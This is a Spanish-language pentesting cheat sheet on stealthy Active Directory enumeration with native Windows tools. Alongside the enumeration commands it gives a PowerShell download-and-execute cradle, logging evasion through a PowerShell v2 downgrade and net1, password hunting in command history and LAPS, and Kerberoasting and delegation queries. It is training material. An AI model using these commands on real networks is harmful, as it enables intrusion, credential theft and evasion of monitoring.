---
tags:
  - AD
  - LOTL
  - windows
  - enum
---
## Conceptos Clave

* Se basa exclusivamente en el uso de herramientas y comandos nativos de Windows/Active Directory para la enumeración de entornos.
* Es un enfoque táctico de gran sigilo ("stealth") diseñado para evitar la generación de alertas en sistemas de monitorización (IDS/IPS, Firewalls) y soluciones de seguridad de endpoint (EDR/Antivirus).
* Reduce exponencialmente la probabilidad de detección al no requerir la descarga o carga de binarios ofensivos externos en la máquina comprometida.

  
## Herramientas Clave

* **CMD/PowerShell:** Entornos de ejecución principales para consultas del sistema, manipulación de variables y descargas en memoria.
* **WMI (Windows Management Instrumentation):** Motor nativo para interactuar y extraer información tanto de hosts locales como remotos dentro del dominio.
* **Comandos Net (net.exe / net1.exe):** Utilidades clásicas para enumerar usuarios, grupos, políticas y recursos compartidos del dominio.
* **Dsquery:** Herramienta de línea de comandos basada en filtros LDAP para buscar objetos específicos (usuarios, computadoras) en el Directorio Activo.

  
## Metodología Paso a Paso

1. **Reconocimiento y Evasión Local:** Primero, identificar el sistema operativo, nivel de parches y arquitectura. Seguidamente, verificar y alterar (en memoria) las políticas de ejecución y evadir el registro de eventos (Script Block Logging) de PowerShell mediante downgrade de versión.
2. **Identificación de Defensas y Sesiones:** Confirmar el estado del Firewall de Windows y del Antivirus (Windows Defender) para entender qué tráfico o acciones están restringidas. Comprobar si hay otros usuarios conectados para evitar interrumpir sesiones legítimas y ser detectados.
3. **Mapeo de Red:** Extraer la tabla ARP y las reglas de enrutamiento para descubrir otros segmentos de red, subredes ocultas y posibles rutas para movimiento lateral.
4. **Enumeración del Dominio:** Utilizar `wmic`, `net` y `dsquery` para extraer listas de controladores de dominio, administradores, políticas de contraseñas y atributos vulnerables de los usuarios sin necesidad de herramientas como BloodHound.

  
## Cheat Sheet de Comandos

### Enumeración Básica del Host
```powershell
# Imprime el nombre del equipo

hostname
```
  
```powershell
# Muestra un resumen general del host en una sola salida

systeminfo
```
  
```powershell
# Imprime la versión del OS y nivel de revisión

[System.Environment]::OSVersion.Version
```
  
```powershell
# Muestra los parches y hotfixes aplicados

wmic qfe get Caption,Description,HotFixID,InstalledOn
```
  
```powershell
# Lista todas las variables de entorno de la sesión

set
```
  
```powershell
# Muestra el dominio al que pertenece el host (desde CMD)

echo %USERDOMAIN%
```
  
```powershell
# Imprime el nombre del controlador de dominio que autenticó al host (desde CMD)

echo %logonserver%
```

  
### PowerShell: Evasión, Historial y Descargas
```powershell
# Imprime la configuración de la política de ejecución actual

Get-ExecutionPolicy -List
```
  
```powershell
# Cambia la política a Bypass solo para el proceso actual (no persistente)

Set-ExecutionPolicy Bypass -Scope Process
```
  
```powershell
# Lista variables de entorno, rutas, nombre de usuario y equipo

Get-ChildItem Env: | ft Key,Value
```
  
```powershell
# Lee el historial de comandos de PowerShell del usuario actual (puede contener contraseñas)

Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
  
```powershell
# Ejecuta un payload en memoria descargado desde una URL externa

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<PAYLOAD_URL>'); <FOLLOW_ON_COMMANDS>"
```
  
```powershell
# Intenta iniciar PowerShell en versión 2.0 para evadir el Script Block Logging

powershell.exe -version 2
```

  
### Verificación de Defensas y Usuarios Conectados

```powershell
# Muestra la configuración de todos los perfiles del firewall de Windows

netsh advfirewall show allprofiles
```
  
```powershell
# Verifica si el servicio de Windows Defender está en ejecución (desde CMD)

sc query windefend
```
  
```powershell
# Enumera la configuración, estado y actualizaciones de Windows Defender

Get-MpComputerStatus
```
  
```powershell
# Muestra las sesiones activas en el host para confirmar si hay otros usuarios conectados

qwinsta
```

  
### Información de Red y Enrutamiento
```powershell
# Imprime configuraciones y estado de los adaptadores de red

ipconfig /all
```
  
```powershell
# Lista los hosts conocidos en la tabla ARP

arp -a
```
  
```powershell
# Muestra la tabla de enrutamiento, útil para descubrir otras subredes

route print
```

  
### Enumeración de Dominio con WMI   
```powershell
# Información básica del host incluyendo dominio y roles

wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
```
  
```powershell
# Lista todos los procesos en el host

wmic process list /format:list
```
  
```powershell
# Información sobre el dominio actual, DCs y relaciones de confianza/forests

wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

```powershell
# Información sobre cuentas locales y de dominio cacheadas

wmic useraccount list /format:list
```
  
```powershell
# Enumera todos los grupos locales

wmic group list /format:list
```
  
```powershell
# Información sobre cuentas de sistema (posibles cuentas de servicio)

wmic sysaccount list /format:list
```

  
### Enumeración de Dominio con Net Commands
```powershell
# Requisitos de contraseña y políticas de bloqueo en el dominio

net accounts /domain
```
  
```powershell
# Lista todos los grupos del dominio

net group /domain
```
  
```powershell
# Lista los usuarios pertenecientes a un grupo específico en el dominio

net group "<DOMAIN_GROUP_NAME>" /domain
```
  
```powershell
# Lista computadoras conectadas al dominio

net group "domain computers" /domain
```
  
```powershell
# Lista las cuentas de computadora de los Domain Controllers

net group "Domain Controllers" /domain
```
  
```powershell
# Extrae información detallada sobre un usuario del dominio

net user <USER_NAME> /domain
```
  
```powershell
# Lista todos los usuarios pertenecientes al grupo de administradores del dominio

net localgroup administrators /domain
```
  
```powershell
# Lista los recursos compartidos disponibles

net share
```
  
```powershell
# Monta un recurso compartido localmente

net use <DRIVE_LETTER>: \\<TARGET_IP_OR_HOSTNAME>\<SHARE_NAME>
```

  

### Enumeración Avanzada con Dsquery (LDAP)

```powershell
# Lista todos los usuarios del dominio

dsquery user
```
  
```powershell
# Lista todas las computadoras del dominio

dsquery computer
```
  
```powershell
# Búsqueda con comodín para ver todos los objetos dentro de una OU o contenedor

dsquery * "CN=Users,DC=<DOMAIN_NAME>,DC=<DOMAIN_TLD>"
```
  
```powershell
# Filtro LDAP: Busca usuarios que tienen habilitado el flag "PASSWD_NOTREQD"

dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
  
```powershell
# Filtro LDAP: Busca todos los Domain Controllers (limitado a 5 resultados)

dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
  
```powershell
# Filtro LDAP (Combinado): Busca usuarios que NO tengan configurado "Password Can't Change"

dsquery * -filter "(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))"
```

  
## "Gotchas" y Troubleshooting

* **Downgrade de PowerShell detectado:** Al ejecutar `powershell.exe -version 2`, los comandos subsecuentes se ocultan del Event Viewer (evade el Script Block Logging introducido en V3). Sin embargo, el comando inicial de downgrade **sí queda registrado** y puede levantar sospechas si un analista nota que los logs se detienen abruptamente.

* **Detección de comandos Net:** Los EDR modernos monitorean agresivamente la ejecución de `net.exe`. Si se ejecuta desde un usuario sin privilegios (ej. en una OU de Marketing), levantará alertas críticas.

* **Bypass de Net.exe:** Como técnica de evasión contra reglas de detección básicas basadas en strings, puedes utilizar `net1` en lugar de `net` (ej. `net1 user /domain`), ya que ejecuta las mismas funciones internamente.

* **Requisitos de Dsquery:** Para utilizar dsquery, el sistema debe tener el rol de AD DS instalado, o bien, debe existir la librería `dsquery.dll` (común en Windows modernos bajo `C:\Windows\System32\dsquery.dll`). Requiere privilegios elevados o ejecución en contexto de SYSTEM para ciertas consultas.

* **Operadores LDAP (Dsquery):** Al construir filtros, la sintaxis utiliza `&` (AND), `|` (OR), y `!` (NOT). El OID `1.2.840.113556.1.4.803` requiere coincidencia exacta de bits, mientras que el `804` requiere coincidencia de cualquier bit en la cadena.

---

## LDAP Search
```powershell
# Kerberoasting (Cuentas de usuario con SPN configurado): Busca usuarios (no computadoras) que tengan un _Service Principal Name_ registrado. Ideal para solicitar tickets TGS.

Get-ADUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))"
```

```powershell
#AS-REP Roasting (Cuentas sin preautenticación de Kerberos): Busca usuarios que tengan el bit `DONT_REQ_PREAUTH` (4194304) activado en su `userAccountControl`.

Get-ADUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

```powershell
# Búsqueda de contraseñas en descripciones (Usuarios):
Get-ADUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(description=*pass*))"
# (Nota: También puedes cambiar pass por pwd, cred o buscar en el atributo `info`).
```

```powershell
# LAPS (Local Administrator Password Solution) Busca computadoras donde tengas permisos para leer la contraseña de LAPS en texto claro.
Get-ADUser -LDAPFilter "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))"
```

```powershell
# **Cuentas con privilegios administrativos (AdminSDHolder protegidas):Cualquier cuenta o grupo que haya sido parte de un grupo privilegiado tendrá este atributo en `1`
Get-ADUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(adminCount=1))"
```

```powershell
# Búsqueda de Domain Controllers: Identifica rápidamente los DCs en el entorno buscando el bit `SERVER_TRUST_ACCOUNT` (8192).
Get-ADUser -LDAPFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
```

```powershell
# Relaciones de Confianza (Trusts): Esencial para planificar saltos entre dominios o bosques.
Get-ADUser -LDAPFilter "(objectClass=trustedDomain)"
```

```powershell
# Unconstrained Delegation (Delegación sin restricciones en Computadoras): Busca equipos en los que, si logras comprometerlos y forzar la autenticación de un administrador, puedes robar su TGT. Bit `TRUSTED_FOR_DELEGATION` (524288).
Get-ADUser -LDAPFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

```powershell
# Constrained Delegation (Delegación restringida): Busca cuentas configuradas para delegar autenticación a servicios específicos (requiere leer el atributo `msDS-AllowedToDelegateTo`).
Get-ADUser -LDAPFilter "(msDS-AllowedToDelegateTo=*)"
```

```powershell
# Resource-Based Constrained Delegation (RBCD): Busca objetos que tengan configurado el atributo de delegación basada en recursos.

Get-ADUser -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
```